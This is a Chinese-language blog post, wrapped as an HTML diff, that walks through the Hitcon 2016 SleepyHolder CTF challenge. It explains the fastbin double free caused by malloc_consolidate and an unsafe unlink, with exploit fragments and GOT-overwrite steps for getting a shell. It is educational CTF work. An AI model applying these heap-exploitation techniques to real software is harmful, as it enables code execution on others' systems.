@@ -1,0 +1,525 @@
+<!doctype html><html lang=zh-cn>
+<head>
+<meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
+<title>How2heap--fastbin_dup_consolidate Hitcon2016--SleepyHolder - hhdx's blog</title>
+<meta name=renderer content="webkit">
+<meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1">
+<meta http-equiv=cache-control content="no-transform">
+<meta http-equiv=cache-control content="no-siteapp">
+<meta name=theme-color content="#f8f5ec">
+<meta name=msapplication-navbutton-color content="#f8f5ec">
+<meta name=apple-mobile-web-app-capable content="yes">
+<meta name=apple-mobile-web-app-status-bar-style content="#f8f5ec">
+<meta name=author content="hhdx"><meta name=description content="前置 Ubuntu 16.04
+使用how2heap脚本编译glibc2.25，其中的4是编译线程数。脚本中git clone慢，可以替换成tsinghua mirrors，把第83行的git clone git://sourceware.org/git/glibc.git &amp;quot;$SRC&amp;quot; 替换成 git clone https://mirrors.tuna.tsinghua.edu.cn/git/glibc.git &amp;quot;$SRC&amp;quot;。
+1  $ ./glibc_build.sh 2.25 -j 4 -disable-tcache   做这道题目使用了glibc2.25，patchelf --set-interpreter /path/to/ld-2.25.so /path/to/exe，patch之后再运行程序就自动使用同目录下libc-2.25.so。
+"><meta name=keywords content="C language,CTF,system engineer">
+<meta name=generator content="Hugo 0.87.0 with theme even">
+<link rel=canonical href=https://hhdx.xyz/post/how2heap-fastbin-dup-consolidate-hitcon2016-sleepyholder/>
+<link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png>
+<link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png>
+<link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png>
+<link rel=manifest href=/manifest.json>
+<link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5>
+<link href=/sass/main.min.0d3b8ec8ed7df891edf32830bfdc6af5976dc6b9ffeb7cd1d0cdd312bcf8e23e.css rel=stylesheet>
+<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin=anonymous>
+<meta property="og:title" content="How2heap--fastbin_dup_consolidate Hitcon2016--SleepyHolder">
+<meta property="og:description" content="前置
+Ubuntu 16.04
+使用how2heap脚本编译glibc2.25，其中的4是编译线程数。脚本中git clone慢，可以替换成tsinghua mirrors，把第83行的git clone git://sourceware.org/git/glibc.git &#34;$SRC&#34; 替换成 git clone https://mirrors.tuna.tsinghua.edu.cn/git/glibc.git &#34;$SRC&#34;。
+
+
+1
+
+
+$ ./glibc_build.sh 2.25 -j 4 -disable-tcache
+
+
+做这道题目使用了glibc2.25，patchelf --set-interpreter /path/to/ld-2.25.so /path/to/exe，patch之后再运行程序就自动使用同目录下libc-2.25.so。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://hhdx.xyz/post/how2heap-fastbin-dup-consolidate-hitcon2016-sleepyholder/"><meta property="article:section" content="post">
+<meta property="article:published_time" content="2020-06-28T23:01:43+00:00">
+<meta property="article:modified_time" content="2020-06-28T23:01:43+00:00">
+<meta itemprop=name content="How2heap--fastbin_dup_consolidate Hitcon2016--SleepyHolder">
+<meta itemprop=description content="前置
+Ubuntu 16.04
+使用how2heap脚本编译glibc2.25，其中的4是编译线程数。脚本中git clone慢，可以替换成tsinghua mirrors，把第83行的git clone git://sourceware.org/git/glibc.git &#34;$SRC&#34; 替换成 git clone https://mirrors.tuna.tsinghua.edu.cn/git/glibc.git &#34;$SRC&#34;。
+
+
+1
+
+
+$ ./glibc_build.sh 2.25 -j 4 -disable-tcache
+
+
+做这道题目使用了glibc2.25，patchelf --set-interpreter /path/to/ld-2.25.so /path/to/exe，patch之后再运行程序就自动使用同目录下libc-2.25.so。"><meta itemprop=datePublished content="2020-06-28T23:01:43+00:00">
+<meta itemprop=dateModified content="2020-06-28T23:01:43+00:00">
+<meta itemprop=wordCount content="1681">
+<meta itemprop=keywords content="CTF,how2heap,"><meta name=twitter:card content="summary">
+<meta name=twitter:title content="How2heap--fastbin_dup_consolidate Hitcon2016--SleepyHolder">
+<meta name=twitter:description content="前置
+Ubuntu 16.04
+使用how2heap脚本编译glibc2.25，其中的4是编译线程数。脚本中git clone慢，可以替换成tsinghua mirrors，把第83行的git clone git://sourceware.org/git/glibc.git &#34;$SRC&#34; 替换成 git clone https://mirrors.tuna.tsinghua.edu.cn/git/glibc.git &#34;$SRC&#34;。
+
+
+1
+
+
+$ ./glibc_build.sh 2.25 -j 4 -disable-tcache
+
+
+做这道题目使用了glibc2.25，patchelf --set-interpreter /path/to/ld-2.25.so /path/to/exe，patch之后再运行程序就自动使用同目录下libc-2.25.so。"><!--[if lte IE 9]><script src=https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js></script><![endif]--><!--[if lt IE 9]><script src=https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js></script>
+<script src=https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js></script><![endif]-->
+</head>
+<body>
+<div id=mobile-navbar class=mobile-navbar>
+<div class=mobile-header-logo>
+<a href=/ class=logo>hhdx's blog</a>
+</div>
+<div class=mobile-navbar-icon>
+<span></span>
+<span></span>
+<span></span>
+</div>
+</div>
+<nav id=mobile-menu class="mobile-menu slideout-menu">
+<ul class=mobile-menu-list>
+<a href=/>
+<li class=mobile-menu-item>Home</li>
+</a><a href=/post/>
+<li class=mobile-menu-item>Archives</li>
+</a><a href=/tags/>
+<li class=mobile-menu-item>Tags</li>
+</a><a href=/links/>
+<li class=mobile-menu-item>Links</li>
+</a><a href=/about/>
+<li class=mobile-menu-item>About</li>
+</a>
+</ul>
+</nav>
+<div class=container id=mobile-panel>
+<header id=header class=header>
+<div class=logo-wrapper>
+<a href=/ class=logo>hhdx's blog</a>
+</div>
+<nav class=site-navbar>
+<ul id=menu class=menu>
+<li class=menu-item>
+<a class=menu-item-link href=/>Home</a>
+</li><li class=menu-item>
+<a class=menu-item-link href=/post/>Archives</a>
+</li><li class=menu-item>
+<a class=menu-item-link href=/tags/>Tags</a>
+</li><li class=menu-item>
+<a class=menu-item-link href=/links/>Links</a>
+</li><li class=menu-item>
+<a class=menu-item-link href=/about/>About</a>
+</li>
+</ul>
+</nav>
+</header>
+<main id=main class=main>
+<div class=content-wrapper>
+<div id=content class=content>
+<article class=post>
+<header class=post-header>
+<h1 class=post-title>How2heap--fastbin_dup_consolidate Hitcon2016--SleepyHolder</h1>
+<div class=post-meta>
+<span class=post-time> 2020-06-28 </span>
+</div>
+</header>
+<div class=post-toc id=post-toc>
+<h2 class=post-toc-title>文章目录</h2>
+<div class="post-toc-content always-active">
+<nav id=TableOfContents>
+<ul>
+<li>
+<ul>
+<li><a href=#前置>前置</a></li>
+<li><a href=#题目分析>题目分析</a>
+<ul>
+<li><a href=#keep>Keep</a></li>
+<li><a href=#wipe>Wipe</a></li>
+<li><a href=#renew>Renew</a></li>
+</ul>
+</li>
+<li><a href=#漏洞分析>漏洞分析</a>
+<ul>
+<li><a href=#double-free>double free</a></li>
+<li><a href=#unsafe-unlink>unsafe unlink</a></li>
+</ul>
+</li>
+<li><a href=#ref>ref</a></li>
+</ul>
+</li>
+</ul>
+</nav>
+</div>
+</div>
+<div class=post-content>
+<h2 id=前置>前置</h2>
+<p>Ubuntu 16.04</p>
+<p>使用how2heap脚本编译glibc2.25，其中的4是编译线程数。脚本中<code>git clone</code>慢，可以替换成<a href=https://mirrors.tuna.tsinghua.edu.cn/>tsinghua mirrors</a>，把第83行的<code>git clone git://sourceware.org/git/glibc.git "$SRC"</code> 替换成<code> git clone https://mirrors.tuna.tsinghua.edu.cn/git/glibc.git "$SRC"</code>。</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>$ ./glibc_build.sh 2.25 -j <span class=m>4</span> -disable-tcache
+</code></pre></td></tr></table>
+</div>
+</div><p>做这道题目使用了glibc2.25，<code>patchelf --set-interpreter /path/to/ld-2.25.so /path/to/exe</code>，patch之后再运行程序就自动使用同目录下libc-2.25.so。</p>
+<h2 id=题目分析>题目分析</h2>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>Arch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    Canary found
+NX:       NX enabled
+PIE:      No PIE (0x3ff000)
+</code></pre></td></tr></table>
+</div>
+</div><p>程序主要有以下三个功能</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>1. Keep secret
+2. Wipe secret
+3. Renew secret
+</code></pre></td></tr></table>
+</div>
+</div><h3 id=keep>Keep</h3>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=n>flag</span> <span class=p>)</span>
+<span class=p>{</span>
+    <span class=n>ptr</span> <span class=o>=</span> <span class=n>calloc</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>size</span><span class=p>);</span>
+    <span class=n>flag</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
+    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;Tell me your secret: &#34;</span><span class=p>);</span>
+    <span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>ptr</span><span class=p>,</span> <span class=n>size</span><span class=p>);</span>
+<span class=p>}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>他可以分配的大小有small：40个字节，big：4000个字节，huge：400000个字节。flag表示其分配过没有，ptr来存储分配的指针，他们都是存储在bss段的全局变量。分别将他们称为small_ptr, small_flag; big_ptr, big_flag; huge_ptr, huge_flag，其布局如下</p>
+<p><img src=https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200629161958717.png alt=image-20200629161958717></p>
+<h3 id=wipe>Wipe</h3>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=n>free</span><span class=p>(</span><span class=n>ptr</span><span class=p>);</span>
+<span class=n>flag</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>指定free某块，huge大小的块不可以free。这里没有检查flag，也没有进行指针的置0，可以进行多次分配。</p>
+<h3 id=renew>Renew</h3>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=k>if</span> <span class=p>(</span><span class=n>flag</span><span class=p>)</span>
+<span class=p>{</span>
+    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;Tell me your secret: &#34;</span><span class=p>);</span>
+    <span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>ptr</span><span class=p>,</span> <span class=n>size</span><span class=p>);</span>
+<span class=p>}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>可以对块中的内容进行更新，也是除了huge。</p>
+<h2 id=漏洞分析>漏洞分析</h2>
+<h3 id=double-free>double free</h3>
+<p>正如fastbin_dup_consolidate中所所说的，使用<code>malloc_consolidate</code>可以造成fastbin的double free。第一次free fastbin会将其放到fastbin链表中，而后分配largebin，出于避免碎片化的目的，将会调用<code>malloc_consolidate</code>将fastbin中的chunk转移到unsortedbin并将相邻下一chunk的<code>pre_in_use</code>置0。后面遍历unsortedbin得不到使用，就会放到smallbin中。具体的过程可以看这张图片<a href=https://raw.githubusercontent.com/cloudburst/libheap/master/heap.png>heap.png</a>。</p>
+<p>下面是glibc中malloc largebin前调用malloc_consolidate的注释。(不知道为什么glibc缩进这么诡异。。)</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-c data-lang=c>  <span class=cm>/*
+</span><span class=cm>     If this is a large request, consolidate fastbins before continuing.
+</span><span class=cm>     While it might look excessive to kill all fastbins before
+</span><span class=cm>     even seeing if there is space available, this avoids
+</span><span class=cm>     fragmentation problems normally associated with fastbins.
+</span><span class=cm>     Also, in practice, programs tend to have runs of either small or
+</span><span class=cm>     large requests, but less often mixtures, so consolidation is not
+</span><span class=cm>     invoked all that often in most programs. And the programs that
+</span><span class=cm>     it is called frequently in otherwise tend to fragment.
+</span><span class=cm>   */</span>
+
+  <span class=k>else</span>
+    <span class=p>{</span>
+      <span class=n>idx</span> <span class=o>=</span> <span class=n>largebin_index</span> <span class=p>(</span><span class=n>nb</span><span class=p>);</span>
+      <span class=k>if</span> <span class=p>(</span><span class=n>atomic_load_relaxed</span> <span class=p>(</span><span class=o>&amp;</span><span class=n>av</span><span class=o>-&gt;</span><span class=n>have_fastchunks</span><span class=p>))</span>
+        <span class=n>malloc_consolidate</span> <span class=p>(</span><span class=n>av</span><span class=p>);</span>
+    <span class=p>}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>题目中的利用过程</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=n>keep</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
+<span class=n>keep</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
+<span class=n>wipe</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+<span class=n>keep</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>        <span class=c1># trigger malloc_consolidate</span>
+<span class=n>wipe</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>             <span class=c1># double free</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id=unsafe-unlink>unsafe unlink</h3>
+<p>题目中这个small大小的chunk，在放到unsortedbin中时，前chunk的<code>pre_in_use</code>位已经被清，第二次free回收fastbin中也没有检查，这里就可以利用unlink的攻击了。</p>
+<p>再次分配此small块，在其中构造fake_chunk。free相邻的下一个big块，在它free过程中会进行前后chunk的探测，如果没有在使用就会进行合并。</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=c1>// glibc release/2.25/master 4014~4031
+</span><span class=c1></span><span class=cm>/* consolidate backward */</span>
+<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>prev_inuse</span><span class=p>(</span><span class=n>p</span><span class=p>))</span> <span class=p>{</span>
+    <span class=n>prevsize</span> <span class=o>=</span> <span class=n>prev_size</span> <span class=p>(</span><span class=n>p</span><span class=p>);</span>
+    <span class=n>size</span> <span class=o>+=</span> <span class=n>prevsize</span><span class=p>;</span>
+    <span class=n>p</span> <span class=o>=</span> <span class=n>chunk_at_offset</span><span class=p>(</span><span class=n>p</span><span class=p>,</span> <span class=o>-</span><span class=p>((</span><span class=kt>long</span><span class=p>)</span> <span class=n>prevsize</span><span class=p>));</span>
+    <span class=n>unlink</span><span class=p>(</span><span class=n>av</span><span class=p>,</span> <span class=n>p</span><span class=p>,</span> <span class=n>bck</span><span class=p>,</span> <span class=n>fwd</span><span class=p>);</span>
+<span class=p>}</span>
+
+<span class=k>if</span> <span class=p>(</span><span class=n>nextchunk</span> <span class=o>!=</span> <span class=n>av</span><span class=o>-&gt;</span><span class=n>top</span><span class=p>)</span> <span class=p>{</span>
+    <span class=cm>/* get and clear inuse bit */</span>
+    <span class=n>nextinuse</span> <span class=o>=</span> <span class=n>inuse_bit_at_offset</span><span class=p>(</span><span class=n>nextchunk</span><span class=p>,</span> <span class=n>nextsize</span><span class=p>);</span>
+
+    <span class=cm>/* consolidate forward */</span>
+    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>nextinuse</span><span class=p>)</span> <span class=p>{</span>
+        <span class=n>unlink</span><span class=p>(</span><span class=n>av</span><span class=p>,</span> <span class=n>nextchunk</span><span class=p>,</span> <span class=n>bck</span><span class=p>,</span> <span class=n>fwd</span><span class=p>);</span>
+        <span class=n>size</span> <span class=o>+=</span> <span class=n>nextsize</span><span class=p>;</span>
+    <span class=p>}</span> <span class=k>else</span>
+        <span class=n>clear_inuse_bit_at_offset</span><span class=p>(</span><span class=n>nextchunk</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+    <span class=p>...</span>
+<span class=p>}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>在unlink中，会对fd->bk和bk->fd进行检查。</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=c1>// glibc release/2.25/master 1384~1389
+</span><span class=c1></span><span class=cm>/* Take a chunk off a bin list */</span>
+<span class=cp>#define unlink(AV, P, BK, FD) {                                            \
+</span><span class=cp>    FD = P-&gt;fd;								      \
+</span><span class=cp>    BK = P-&gt;bk;								      \
+</span><span class=cp>    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      \
+</span><span class=cp>      malloc_printerr (check_action, &#34;corrupted double-linked list&#34;, P, AV);  \
+</span></code></pre></td></tr></table>
+</div>
+</div><p>在题目中，可以非常巧妙地使用small_ptr处存储的变量来绕过检查。如下面所示</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=n>small_ptr</span> <span class=o>=</span> <span class=mh>0x6020D0</span>
+<span class=n>fake_fd</span> <span class=o>=</span> <span class=n>small_ptr</span> <span class=o>-</span> <span class=mh>0x18</span>
+<span class=n>fake_bk</span> <span class=o>=</span> <span class=n>small_ptr</span> <span class=o>-</span> <span class=mh>0x10</span>
+<span class=n>fake_chunk</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x21</span><span class=p>)</span>
+<span class=n>fake_chunk</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_fd</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_bk</span><span class=p>)</span> 
+<span class=n>fake_chunk</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x20</span><span class=p>)</span>
+<span class=n>keep</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>fake_chunk</span><span class=p>)</span>			<span class=c1># prepare for unsafe unlink</span>
+<span class=n>wipe</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><code>fake_fd->bk</code>和<code>fake_bk->fd</code>等于small_ptr，且为伪造chunk的起始地址。之后unlink中的</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=c1>// glibc release/2.25/master 1391~1392
+</span><span class=c1></span><span class=n>FD</span><span class=o>-&gt;</span><span class=n>bk</span> <span class=o>=</span> <span class=n>BK</span><span class=p>;</span>							      \
+<span class=n>BK</span><span class=o>-&gt;</span><span class=n>fd</span> <span class=o>=</span> <span class=n>FD</span><span class=p>;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>就将small_ptr存储的地址，覆盖为fake_fd。</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>0x6020b0:	0x00007f0863f6b600	0x0000000000000000
+0x6020c0:	0x0000000002308f00	0x00007f086412c010
+0x6020d0:	0x00000000006020b8	0x0000000100000000
+0x6020e0:	0x0000000000000001	0x0000000000000000
+0x6020f0:	0x0000000000000000	0x0000000000000000
+</code></pre></td></tr></table>
+</div>
+</div><p>由之前的bss布局图可以看到0x6020d0处存储的就是small_ptr，所以可以使用<code>renew(small)</code>进行对这几个变量覆写。</p>
+<p>后面就不在展开了，就是把free_got改写成puts_plt进行泄露，然后把atoi_got改写成system地址，输入<code>sh\x00</code>就可以获得shell。</p>
+<p><a href=https://github.com/clxsh/ctf_wps/blob/master/others/Hitcon2016-SleepyHolder/exp.py>exp</a></p>
+<h2 id=ref>ref</h2>
+<ol>
+<li>
+<p>how2heap fastbin_dup_consolidate.c</p>
+</li>
+<li>
+<p><a href=https://github.com/mehQQ/public_writeup/tree/master/hitcon2016/SleepyHolder>https://github.com/mehQQ/public_writeup/tree/master/hitcon2016/SleepyHolder</a></p>
+</li>
+</ol>
+</div>
+<div class=post-copyright>
+<p class=copyright-item>
+<span class=item-title>文章作者</span>
+<span class=item-content>hhdx</span>
+</p>
+<p class=copyright-item>
+<span class=item-title>上次更新</span>
+<span class=item-content>
+2020-06-28
+</span>
+</p>
+</div>
+<footer class=post-footer>
+<div class=post-tags>
+<a href=/tags/ctf/>CTF</a>
+<a href=/tags/how2heap/>how2heap</a>
+</div>
+<nav class=post-nav>
+<a class=prev href=/post/how2heap-house-of-spirit-hacklu2014-oreo/>
+<i class="iconfont icon-left"></i>
+<span class="prev-text nav-default">how2heap--House_of_Spirit Hack.lu2014--oreo</span>
+<span class="prev-text nav-mobile">上一篇</span>
+</a>
+<a class=next href=/post/ucore-os-lab7%E7%AC%94%E8%AE%B0/>
+<span class="next-text nav-default">ucore os lab7笔记</span>
+<span class="next-text nav-mobile">下一篇</span>
+<i class="iconfont icon-right"></i>
+</a>
+</nav>
+</footer>
+</article>
+</div>
+<div id=disqus_thread></div>
+<script type=text/javascript>(function(){var a,b;if(window.location.hostname==='localhost')return;a=document.createElement('script'),a.type='text/javascript',a.async=!0,b='lyliuchao',a.src='//'+b+'.disqus.com/embed.js',(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(a)})()</script>
+<noscript>Please enable JavaScript to view the <a href=http://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
+</div>
+</main>
+<footer id=footer class=footer>
+<div class=social-links>
+<a href=https://github.com/clxsh class="iconfont icon-github" title=github></a>
+<a href=https://www.douban.com/people/57285004/ class="iconfont icon-douban" title=douban></a>
+<a href=https://hhdx.xyz/index.xml type=application/rss+xml class="iconfont icon-rss" title=rss></a>
+</div>
+<div class=copyright>
+<span class=power-by>
+由 <a class=hexo-link href=https://gohugo.io>Hugo</a> 强力驱动
+</span>
+<span class=division>|</span>
+<span class=theme-info>
+主题 -
+<a class=theme-link href=https://github.com/olOwOlo/hugo-theme-even>Even</a>
+</span>
+<span class=copyright-year>
+&copy;
+2016 -
+2021<span class=heart><i class="iconfont icon-heart"></i></span><span>hhdx</span>
+</span>
+</div>
+</footer>
+<div class=back-to-top id=back-to-top>
+<i class="iconfont icon-up"></i>
+</div>
+</div>
+<script src=https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin=anonymous></script>
+<script src=https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin=anonymous></script>
+<script src=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin=anonymous></script>
+<script type=text/javascript src=/js/main.min.c99b103c33d1539acf3025e1913697534542c4a5aa5af0ccc20475ed2863603b.js></script>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','UA-177325662-1','auto'),ga('set','anonymizeIp',!0),ga('send','pageview'))</script>
+<script async src=https://www.google-analytics.com/analytics.js></script>
+</body>
+</html>
